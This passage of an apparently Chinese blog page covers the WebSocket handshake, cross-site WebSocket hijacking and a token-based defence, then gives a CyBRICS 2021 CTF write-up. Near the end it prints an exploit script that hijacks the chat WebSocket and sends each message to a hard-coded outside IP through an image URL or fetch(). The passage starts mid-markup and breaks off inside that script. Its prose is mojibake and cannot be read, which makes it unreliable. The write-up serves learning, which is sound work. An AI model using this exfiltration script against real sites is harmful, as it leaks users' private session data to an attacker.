class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">GET ws:<span class="hljs-comment">//echo.websocket.org/?encoding=text HTTP/1.1</span><br>Host: echo.websocket.org<br>Connection: Upgrade<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade: websocket<br>Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Sec-WebSocket-Version: <span class="hljs-number">13</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10_11_4</span>) Chrome/<span class="hljs-number">49.0</span><span class="hljs-number">.2623</span><span class="hljs-number">.110</span><br>Accept-Encoding: gzip, deflate, sdch<br>Accept-Language: en-US,en;q=<span class="hljs-number">0.8</span>,zh-CN;q=<span class="hljs-number">0.6</span><br>Cookie: _gat=<span class="hljs-number">1</span>; _ga=GA1<span class="hljs-number">.2</span><span class="hljs-number">.2904372</span><span class="hljs-number">.1459647651</span>; JSESSIONID=1A9431CF043F851E0356F5837845B2EC<br>Sec-WebSocket-Key: 7ARps0AjsHN8bx5dCI1KKQ==<br>Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits<br></code></pre></div></td></tr></table></figure><p>å“åº”</p><figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">101</span> Web Socket Protocol Handshake<br>Access-Control-Allow-Credentials: <span class="hljs-literal">true</span><br>Access-Control-Allow-Headers: content-type<br>Access-Control-Allow-Headers: authorization<br>Access-Control-Allow-Headers: x-websocket-extensions<br>Access-Control-Allow-Headers: x-websocket-version<br>Access-Control-Allow-Headers: x-websocket-protocol<br>Access-Control-Allow-Origin: http:<span class="hljs-comment">//www.websocket.org</span><br>Connection: Upgrade<br><span class="hljs-built_in">Date</span>: Sun, <span class="hljs-number">03</span> Apr <span class="hljs-number">2016</span> <span class="hljs-number">03</span>:<span class="hljs-number">09</span>:<span class="hljs-number">21</span> GMT<br>Sec-WebSocket-Accept: wW9Bl95VtfJDbpHdfivy7csOaDo=<br>Server: Kaazing Gateway<br>Upgrade: websocket<br></code></pre></div></td></tr></table></figure><p>æ ¸å¿ƒåœ¨<code>Connectionï¼šUpgrade å’Œ Upgradeï¼šwebsocket ä¸¤è¡Œã€‚è¿™ä¸¤è¡Œç›¸å½“äºå‘Šè¯‰æœåŠ¡å™¨ç«¯ï¼šæˆ‘è¦ç”³è¯·åˆ‡æ¢åˆ° WebSocket åè®®ã€‚</code></p><p>ä¸€æ—¦æœåŠ¡å™¨ç«¯è¿”å› 101 å“åº”ï¼Œå³å¯å®Œæˆ WebSocket åè®®åˆ‡æ¢ã€‚æœåŠ¡å™¨ç«¯å³å¯ä»¥åŸºäºç›¸åŒç«¯å£ï¼Œå°†é€šä¿¡åè®®ä» http://æˆ– https://åˆ‡æ¢åˆ° ws://æˆ– wss://ã€‚</p><p>æŠ¥æ–‡ä¸­ä¹Ÿæœ‰å’Œcookieç±»ä¼¼çš„<code>Sec-WebSocket-Key</code>,è¿™æ˜¯ä¸€ä¸ªæ•£åˆ—keyï¼Œç»è¿‡äº†base64ç¼–ç ï¼ŒæœåŠ¡å™¨åˆ™ä¼šå°†ä¸€ä¸ª GUID å’Œè¿™ä¸ªå®¢æˆ·ç«¯çš„éšæœºæ•°ä¸€èµ·ç”Ÿæˆä¸€ä¸ªæ•£åˆ— Key ä½œä¸º Sec-WebSocket-Accept è¿”å›ç»™å®¢æˆ·ç«¯ã€‚è¿™ä¸ªå·¥ä½œæœºåˆ¶å¯ä»¥ç”¨æ¥é¿å…ç¼“å­˜ä»£ç†ï¼ˆcaching proxyï¼‰ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥é¿å…è¯·æ±‚é‡æ’­ï¼ˆrequest replayï¼‰ã€‚</p><p>å¯¹äº<code>Access-Control-Allow-Headers</code>,ä»¥â€œSec-â€å¼€å¤´çš„ Header å¯ä»¥é¿å…è¢«æµè§ˆå™¨è„šæœ¬è¯»å–åˆ°ï¼Œè¿™æ ·æ”»å‡»è€…å°±ä¸èƒ½åˆ©ç”¨ XMLHttpRequest ä¼ªé€  WebSocket è¯·æ±‚æ¥æ‰§è¡Œè·¨åè®®æ”»å‡»ï¼Œå› ä¸º XMLHttpRequest æ¥å£ä¸å…è®¸è®¾ç½® Sec-å¼€å¤´çš„ Headerã€‚</p><h4 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h4><p>æ”¯æŒåŒå‘é€šä¿¡ï¼Œå®æ—¶æ€§æ›´å¼ºã€‚</p><p>æ›´å¥½çš„äºŒè¿›åˆ¶æ”¯æŒã€‚</p><p>è¾ƒå°‘çš„æ§åˆ¶å¼€é”€ã€‚è¿æ¥åˆ›å»ºåï¼Œwså®¢æˆ·ç«¯ã€æœåŠ¡ç«¯è¿›è¡Œæ•°æ®äº¤æ¢æ—¶ï¼Œåè®®æ§åˆ¶çš„æ•°æ®åŒ…å¤´éƒ¨è¾ƒå°ã€‚åœ¨ä¸åŒ…å«å¤´éƒ¨çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡ç«¯åˆ°å®¢æˆ·ç«¯çš„åŒ…å¤´åªæœ‰2~10å­—èŠ‚(å–å†³äºæ•°æ®åŒ…é•¿åº¦)ï¼Œå®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„è¯ï¼Œéœ€è¦åŠ ä¸Šé¢å¤–4å­—èŠ‚çš„æ©ç ã€‚è€ŒHTTPåè®®æ¯æ¬¡é€šä¿¡éƒ½éœ€è¦æºå¸¦å®Œæ•´çš„å¤´éƒ¨ã€‚</p><p>æ”¯æŒæ‰©å±•ã€‚wsåè®®å®šä¹‰äº†æ‰©å±•ï¼Œç”¨æˆ·å¯ä»¥æ‰©å±•åè®®ï¼Œæˆ–è€…å®ç°è‡ªå®šä¹‰çš„å­åè®®ã€‚(æ¯”å¦‚æ”¯æŒè‡ªå®šä¹‰å‹ç¼©ç®—æ³•ç­‰)</p><h3 id="è·¨ç«™ç‚¹-WebSocket-åŠ«æŒæ¼æ´åŸç†"><a href="#è·¨ç«™ç‚¹-WebSocket-åŠ«æŒæ¼æ´åŸç†" class="headerlink" title="è·¨ç«™ç‚¹ WebSocket åŠ«æŒæ¼æ´åŸç†"></a>è·¨ç«™ç‚¹ WebSocket åŠ«æŒæ¼æ´åŸç†</h3><p>çœ‹äº†å¯¹äºè¿™ä¸ªçš„ä»‹ç»ï¼Œæ„Ÿè§‰å’ŒCSRFç¡®å®æœ‰äº›åƒï¼Œä½†åˆæœ‰äº›æ ¹æœ¬ä¸Šçš„åŒºåˆ«ï¼ŒCSRFåªæ˜¯é€šè¿‡æ¶æ„ç½‘ç«™æˆ–è€…å…¶ä»–æ–¹æ³•ä¼ªé€ å®¢æˆ·è¿›è¡Œè¯·æ±‚ï¼Œä¸ä¼šå¯¼è‡´ä¿¡æ¯æ³„æ¼é—®é¢˜ï¼Œä¹Ÿä¸ä¼šçªƒå¬åˆ°æ•´ä¸ªæ¶ˆæ¯é€šé“å’Œä¿®æ”¹æœåŠ¡å™¨æ•°æ®ã€‚</p><h4 id="ä»€ä¹ˆæ˜¯è·¨ç«™ç‚¹-WebSocket-åŠ«æŒæ¼æ´"><a href="#ä»€ä¹ˆæ˜¯è·¨ç«™ç‚¹-WebSocket-åŠ«æŒæ¼æ´" class="headerlink" title="ä»€ä¹ˆæ˜¯è·¨ç«™ç‚¹ WebSocket åŠ«æŒæ¼æ´"></a>ä»€ä¹ˆæ˜¯è·¨ç«™ç‚¹ WebSocket åŠ«æŒæ¼æ´</h4><p>çœ‹çœ‹ä¸Šé¢çš„æŠ¥æ–‡ï¼Œå¯ä»¥å‘ç°Cookie å¤´éƒ¨æŠŠåŸŸåä¸‹çš„ Cookie éƒ½å‘é€åˆ°æœåŠ¡å™¨ç«¯ã€‚å…¶å®WebSocketåè®®å¹¶æ²¡æœ‰è§„å®šæœåŠ¡å™¨åœ¨æ¡æ‰‹æ—¶åº”è¯¥å¦‚ä½•ç¡®è®¤å®¢æˆ·ç«¯çš„èº«ä»½ï¼ŒæœåŠ¡å™¨å¯ä»¥é‡‡ç”¨ä»»ä½• HTTP æœåŠ¡å™¨çš„å®¢æˆ·ç«¯èº«ä»½è®¤è¯æœºåˆ¶ï¼Œè­¬å¦‚ cookieï¼ŒHTTP åŸºç¡€è®¤è¯ï¼ŒTLS èº«ä»½è®¤è¯ç­‰ã€‚çœ‹åˆ°è¿™ï¼Œéƒ½å¯ä»¥è”æƒ³åˆ°CSRFæ¥ç»•è¿‡èº«ä»½è®¤è¯è·å¾—æ¡æ‰‹ï¼Œå…¶å®å¤§è‡´è¿‡ç¨‹ä¹Ÿå’ŒCSRFå·®ä¸å¤šã€‚</p><blockquote><p>å› ä¸º WebSocket çš„å®¢æˆ·ç«¯ä¸ä»…ä»…å±€é™äºæµè§ˆå™¨ï¼Œå› æ­¤ WebSocket è§„èŒƒæ²¡æœ‰è§„èŒƒ Origin å¿…é¡»ç›¸åŒï¼ˆæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥é˜…è¯»è§„èŒƒ  10.2 ç« èŠ‚äº†è§£å¯¹äº Origin çš„è§„èŒƒï¼‰ã€‚æ‰€æœ‰çš„æµè§ˆå™¨éƒ½ä¼šå‘é€ Origin è¯·æ±‚å¤´ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯æ²¡æœ‰é’ˆå¯¹ Origin  å¤´éƒ¨è¿›è¡ŒéªŒè¯å¯èƒ½ä¼šå¯¼è‡´è·¨ç«™ç‚¹ WebSocket  åŠ«æŒæ”»å‡»ã€‚è­¬å¦‚ï¼ŒæŸä¸ªç”¨æˆ·å·²ç»ç™»å½•äº†åº”ç”¨ç¨‹åºï¼Œå¦‚æœä»–è¢«è¯±éª—è®¿é—®æŸä¸ªç¤¾äº¤ç½‘ç«™çš„æ¶æ„ç½‘é¡µï¼Œæ¶æ„ç½‘é¡µåœ¨æŸå…ƒç´ ä¸­æ¤å…¥ä¸€ä¸ª WebSocket  æ¡æ‰‹è¯·æ±‚ç”³è¯·è·Ÿç›®æ ‡åº”ç”¨å»ºç«‹ WebSocket è¿æ¥ã€‚ä¸€æ—¦æ‰“å¼€è¯¥æ¶æ„ç½‘é¡µï¼Œåˆ™è‡ªåŠ¨å‘èµ·å¦‚ä¸‹è¯·æ±‚ã€‚è¯·æ³¨æ„ï¼ŒOrigin å’Œ  Sec-WebSocket-Key éƒ½æ˜¯ç”±æµè§ˆå™¨è‡ªåŠ¨ç”Ÿæˆï¼ŒCookie  ç­‰èº«ä»½è®¤è¯å‚æ•°ä¹Ÿéƒ½æ˜¯ç”±æµè§ˆå™¨è‡ªåŠ¨ä¸Šä¼ åˆ°ç›®æ ‡åº”ç”¨æœåŠ¡å™¨ç«¯ã€‚å¦‚æœæœåŠ¡å™¨ç«¯ç–äºæ£€æŸ¥ Originï¼Œè¯¥è¯·æ±‚åˆ™ä¼šæˆåŠŸæ¡æ‰‹åˆ‡æ¢åˆ° WebSocket  åè®®ï¼Œæ¶æ„ç½‘é¡µå°±å¯ä»¥æˆåŠŸç»•è¿‡èº«ä»½è®¤è¯è¿æ¥åˆ° WebSocket  æœåŠ¡å™¨ï¼Œè¿›è€Œçªƒå–åˆ°æœåŠ¡å™¨ç«¯å‘æ¥çš„ä¿¡æ¯ï¼ŒæŠ‘æˆ–å‘é€ä¼ªé€ ä¿¡æ¯åˆ°æœåŠ¡å™¨ç«¯ç¯¡æ”¹æœåŠ¡å™¨ç«¯æ•°æ®ã€‚</p></blockquote><h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><blockquote><p>WebSocket ä»¤ç‰Œæœºåˆ¶</p></blockquote><p>ä»¥ä¸Šçœ‹èµ·æ¥å¾ˆç¾å¥½ï¼Œä½†æ˜¯ä»…ä»…æ£€æŸ¥ Origin è¿œè¿œä¸å¤Ÿï¼Œåˆ«å¿˜è®°äº†ï¼Œå¦‚æœ WebSocket  çš„å®¢æˆ·ç«¯ä¸æ˜¯æµè§ˆå™¨ï¼Œéæµè§ˆå™¨çš„å®¢æˆ·ç«¯å‘æ¥çš„è¯·æ±‚æ ¹æœ¬å°±æ²¡æœ‰ Originã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¦è®°å¾—ï¼Œæ¶æ„ç½‘é¡µæ˜¯å¯ä»¥ä¼ªé€  Origin  å¤´ä¿¡æ¯çš„ã€‚æ›´å½»åº•çš„è§£å†³æ–¹æ¡ˆè¿˜æ˜¯è¦å€Ÿé‰´ CSRF çš„è§£å†³æ–¹æ¡ˆï¼ä»¤ç‰Œæœºåˆ¶ã€‚</p><p> é‰´äºç¯‡å¹…åŸå› ï¼Œç¬”è€…å°±ä¸è¯¦ç»†è´´å‡ºæ•´ä¸ªè®¾è®¡å’Œä»£ç ï¼Œå»ºè®®è¯»è€…å‚ç…§ä»¥ä¸‹æ¦‚è¦è®¾è®¡æé«˜ WebSocket åº”ç”¨çš„å®‰å…¨ã€‚</p><p> \1. æœåŠ¡å™¨ç«¯ä¸ºæ¯ä¸ª WebSocket å®¢æˆ·ç«¯ç”Ÿæˆå”¯ä¸€çš„ä¸€æ¬¡æ€§ Tokenï¼›</p><p> \2. å®¢æˆ·ç«¯å°† Token ä½œä¸º WebSocket è¿æ¥ URL çš„å‚æ•°ï¼ˆè­¬å¦‚ ws://echo.websocket.org/?tokenï¼randomOneTimeTokenï¼‰ï¼Œå‘é€åˆ°æœåŠ¡å™¨ç«¯è¿›è¡Œ WebSocket æ¡æ‰‹è¿æ¥ï¼›</p><p> \3. æœåŠ¡å™¨ç«¯éªŒè¯ Token æ˜¯å¦æ­£ç¡®ï¼Œä¸€æ—¦æ­£ç¡®åˆ™å°†è¿™ä¸ª Token æ ‡ç¤ºä¸ºåºŸå¼ƒä¸å†é‡ç”¨ï¼ŒåŒæ—¶ç¡®è®¤ WebSocket æ¡æ‰‹è¿æ¥æˆåŠŸï¼›å¦‚æœ Token éªŒè¯å¤±è´¥æˆ–è€…èº«ä»½è®¤è¯å¤±è´¥ï¼Œåˆ™è¿”å› 403 é”™è¯¯ã€‚</p><p> è¿™ä¸ªæ–¹æ¡ˆé‡Œçš„ Token è®¾è®¡æ˜¯å…³é”®ï¼Œç¬”è€…æ¨èçš„æ–¹æ¡ˆæ˜¯ä¸ºç™»å½•ç”¨æˆ·ç”Ÿæˆä¸€ä¸ª Secure Random å­˜å‚¨åœ¨ Session  ä¸­ï¼Œç„¶ååˆ©ç”¨å¯¹ç§°åŠ å¯†ï¼ˆè­¬å¦‚ AES GCMï¼‰åŠ å¯†è¿™ä¸ª Secure Random å€¼ä½œä¸ºä»¤ç‰Œï¼Œå°†åŠ å¯†åçš„ä»¤ç‰Œå‘é€ç»™å®¢æˆ·ç«¯ç”¨æ¥è¿›è¡Œè¿æ¥ã€‚è¿™æ ·æ¯ä¸ª  Session æœ‰ä¸€ä¸ªå”¯ä¸€çš„éšæœºæ•°ï¼Œæ¯ä¸ªéšæœºæ•°å¯ä»¥é€šè¿‡å¯¹ç§°åŠ å¯†ç”Ÿæˆè‹¥å¹²ä»½ä¸€æ¬¡æ€§ä»¤ç‰Œã€‚ç”¨æˆ·å³ä¾¿é€šè¿‡ä¸åŒç»ˆç«¯é€šè¿‡ WebSocket  è¿æ¥åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¯ä»¥åœ¨ä¿éšœä»¤ç‰Œå”¯ä¸€ä¸”ä¸€æ¬¡æ€§ä½¿ç”¨çš„å‰æä¸‹ï¼Œä¾ç„¶èƒ½å°†ä¸åŒé€šé“ä¸­çš„ä¿¡æ¯å…³è”åˆ°åŒä¸€ç”¨æˆ·ä¸­ã€‚</p><p> å¯èƒ½å­˜åœ¨å¦å¤–ä¸€ä¸ªè®¾è®¡æ€è·¯ï¼Œåœ¨ WebSocket æ¶ˆæ¯ä¸­å¢åŠ ä»¤ç‰Œå’Œèº«ä»½ä¿¡æ¯ï¼Œä½†ç¬”è€…è§‰å¾—è¿™æ ·çš„è®¾è®¡æœ‰æ‚–äº WebSocket çš„è®¾è®¡æ€æƒ³ï¼Œè€Œä¸”å¢åŠ äº†ä¸å¿…è¦çš„ç½‘ç»œè´Ÿè½½ã€‚æŠ›ç –å¼•ç‰ï¼Œæ¬¢è¿è¯»è€…æä¾›æ›´å¥½çš„è®¾è®¡æ–¹æ¡ˆã€‚</p><p>å‚è€ƒ</p><p><a href="https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.base">https://blog.csdn.net/hsany330/article/details/49823495?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-4.base</a></p><p><a href="https://blog.csdn.net/cuixiping/article/details/70048611">https://blog.csdn.net/cuixiping/article/details/70048611</a></p><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>è¿›å…¥å°±æ˜¯ä¸€ä¸ªèŠå¤©æ¡†ï¼Œä¹Ÿæ¯”è¾ƒç¬¦åˆWebSocketæ­£å¸¸çš„åŠŸèƒ½ã€‚F12å…ˆçœ‹ä¸€çœ¼ï¼Œçœ‹åˆ°äº†ä¸€ä¸²javascriptè„šæœ¬</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> conn;<br><span class="hljs-keyword">var</span> sended_message = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandomInt</span>(<span class="hljs-params">min, max</span>) </span>&#123;<br>    min = <span class="hljs-built_in">Math</span>.ceil(min);<br>    max = <span class="hljs-built_in">Math</span>.floor(max);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * (max - min) + min); <span class="hljs-comment">//The maximum is exclusive and the minimum is inclusive</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">item</span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> escaped = $(<span class="hljs-string">&quot;&lt;div&gt;&quot;</span>).text(item).html();<br>    <span class="hljs-keyword">if</span> (item === sended_message) &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-right pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&lt;div class=&quot;font-weight-bold mb-1&quot;&gt;You&lt;/div&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>        sended_message = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        log.innerHTML += <span class="hljs-string">&#x27;&lt;div class=&quot;chat-message-left pb-4&quot;&gt;&lt;div class=&quot;flex-shrink-1 bg-light rounded py-2 px-3 mr-3&quot;&gt;&#x27;</span> +<br>            escaped + <span class="hljs-string">&#x27;&lt;/div&gt;&lt;/div&gt;&#x27;</span>;<br>    &#125;<br>    log.scrollTop = log.scrollHeight;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">let</span> room = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value;<br>    <span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&#x27;room=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(room);<br>    $(<span class="hljs-string">&quot;form input&quot;</span>).prop( <span class="hljs-string">&quot;disabled&quot;</span>, <span class="hljs-literal">false</span> );<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).hide();<br>    $(<span class="hljs-string">&quot;#room&quot;</span>).parent().children().first().text(<span class="hljs-string">&quot;Room &quot;</span> + room);<br><br>    $(<span class="hljs-string">&quot;#connectButton&quot;</span>).hide();<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">window</span>[<span class="hljs-string">&quot;WebSocket&quot;</span>]) &#123;<br>        conn = <span class="hljs-keyword">new</span> WebSocket(<span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>        conn.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-keyword">if</span> (evt.code === <span class="hljs-number">1003</span>) &#123;<br>                item = <span class="hljs-string">`Status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>            &#125;<br>            appendLog(item);<br>        &#125;;<br>        conn.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(<span class="hljs-string">&quot;Connected&quot;</span>);<br>        &#125;;<br>        conn.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>            appendLog(evt.data);<br>        &#125;;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        appendLog(<span class="hljs-string">&quot;Your browser does not support WebSockets.&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-built_in">window</span>.onload = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> room = getRandomInt(<span class="hljs-number">1000</span>, <span class="hljs-number">9999999999</span>);<br>    <span class="hljs-keyword">var</span> msg = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;msg&quot;</span>);<br>    <span class="hljs-keyword">var</span> log = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;log&quot;</span>);<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;form&quot;</span>).onsubmit = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!conn) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (!msg.value) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        conn.send(msg.value);<br>        sended_message = msg.value;<br>        msg.value = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;;<br><br>    <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;room&quot;</span>).value = room;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>å¤§è‡´è¿‡ç¨‹å°±æ˜¯ å…ˆç”Ÿæˆäº†ä¸€ä¸ªéšæœºæ•°å½“ä½œæˆ¿é—´å·ï¼Œç„¶åå®ç°äº†æ¶ˆæ¯æ¥æ”¶å‘é€åœ¨å‰ç«¯çš„æ˜¾ç¤ºï¼Œç„¶åå®ç°äº†WebSocketè¿æ¥æ¥æ¥å—å’Œå‘é€æ¶ˆæ¯ã€‚çœ‹é¢˜ç›®æ„æ€æœ€å¼€å§‹è¿˜è§‰å¾—è¦æ‰¾åˆ°ç§˜å¯†çš„æˆ¿é—´å·ï¼Œä½†çœ‹åˆ°éšæœºç”Ÿæˆçš„èŒƒå›´å°±ä¸å¤ªå¯èƒ½äº†ã€‚åé¢æœ‰å¤§ä½¬å‡ºäº†ï¼Œçœ‹äº†ä¸‹expæ‰çŸ¥é“å’‹åšäº†ã€‚</p><p>å› ä¸ºé¢˜ç›®è¿˜ç»™äº†ä¸€ä¸ªç”µè¯çš„æŒ‰é’®ï¼Œå¯ä»¥è®¿é—®urlå¹¶ä¸”å¯ä»¥å‘é€é—®é¢˜ï¼ŒæŒ‰é¢˜ç›®æè¿°åº”è¯¥å°±æ˜¯é€šè¿‡è¿™ä¸ªç”µè¯æ¥ä¼ªé€ æŠ€æœ¯æ”¯æŒå‘é€<code>Hey, i forgot the flag. Can you remind me?</code>æ¥è·å–flag</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;script&gt;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">appendLog</span>(<span class="hljs-params">msg</span>)</span>&#123;<br><span class="hljs-built_in">document</span>.write(<span class="hljs-string">`&lt;img src=http://39.107.239.30:80/a=<span class="hljs-subst">$&#123;<span class="hljs-built_in">escape</span>(msg)&#125;</span>&gt;&lt;/img&gt;`</span>);<br>   <span class="hljs-comment">//è¿˜å¯ä»¥const logger = (a) =&gt; &#123;</span><br>        <span class="hljs-comment">//fetch(`http://39.107.239.30:80/?q=$&#123;encodeURI(a)&#125;`);</span><br>        <span class="hljs-comment">// &#125;;</span><br>&#125;<br>ws = <span class="hljs-keyword">new</span> WebSocket ( <span class="hljs-string">&quot;ws://multichat-cybrics2021.ctf.su/ws&quot;</span>);<br>    ws.onclose = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">evt</span>)</span>&#123;<br>        <span class="hljs-keyword">var</span> item = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span> (evt.code == <span class="hljs-number">1003</span>)&#123;<br>            item = <span class="hljs-string">`status: <span class="hljs-subst">$&#123;evt.reason&#125;</span>`</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            item = <span class="hljs-string">&quot;Connection closed.&quot;</span>;<br>        &#125;<br>        appendLog(item);<br>    &#125;;<br>ws.onopen = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>)</span>&#123;<br>        appendLog (<span class="hljs-string">&quot;Connected&quot;</span>);          <br>ws.send( <span class="hljs-string">&quot;Hey, i forgot the flag. Can you remind me?&quot;</span>);<br>    &#125;;<br>    ws.onmessage = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">evt</span>) </span>&#123;<br>    appendLog(evt.data)<br>    